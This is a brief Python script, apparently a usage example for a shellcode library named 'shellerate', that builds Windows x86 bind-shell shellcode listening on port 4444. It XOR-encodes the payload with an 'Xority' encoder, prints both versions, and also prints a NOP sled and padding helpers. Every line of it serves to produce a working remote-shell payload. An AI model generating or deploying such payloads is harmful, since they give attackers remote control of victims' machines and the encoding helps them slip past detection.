from shellerate.xority import Xority
from shellerate.bind_shellcode import *

from shellerate.strings import *;
from shellerate.asm_x86 import *;
#logging.basicConfig(format="%(asctime)s [%(levelname)8s] - %(message)s", level=logging.DEBUG)

b=BindShellcode(4444, 'x86', 'win')
b.generate()
e=Xority(b.shellcode())
print(b.shellcode())
print(e.payload())

print(pad("aaa"))
print(nop_sled())
print(zero_with_and())
